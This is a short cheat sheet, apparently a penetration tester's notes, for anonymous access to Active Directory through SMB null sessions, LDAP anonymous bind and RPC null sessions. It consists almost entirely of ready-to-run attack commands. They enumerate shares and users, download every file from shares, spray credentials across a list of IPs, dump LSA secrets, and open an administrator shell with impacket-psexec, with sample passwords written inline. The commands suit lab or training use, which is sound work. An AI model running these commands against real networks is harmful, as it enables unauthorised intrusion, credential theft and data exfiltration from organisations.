#AD_anonymous_access
# **SMB null session**

```bash
smbclient -L //$t -N     # List shares without creds

#smbmap
smbmap -H $t -u '' -p ''

# shares
nxc smb $t -u '' -p '' --shares   
nxc smb $t -u 'guest' -p '' --shares
   
# users   
nxc smb $t -u '' -p '' --users   
nxc smb $t -u 'guest' -p '' --users

# write all the files in your local system
nxc smb $t -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True

# for multiple ips
nxc --verbose smb ./ips.txt -u corpmngr -p 'User4&*&*' --continue-on-success

## if the we found the credents of user which is local administrator then we can run command to dump the lsa
nxc smb 192.168.98.30 -u john -p User1@#$%6 --lsa --verbose

# Connecting to the system if smb is Pwned!
impacket-psexec active.htb/Administrator@Pass123123@192.168.98.12

# getting all smb files from folder
recurse
prompt OFF
mget *
```

# **LDAP anonymous bind**

```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
nxc ldap <IP> -u '' -p '' -M ldap-checker
```

# **RPC null session**
checking for null sessions to get the usernames

```bash
rpcclient -U "" -N <IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroupmem 0x200
```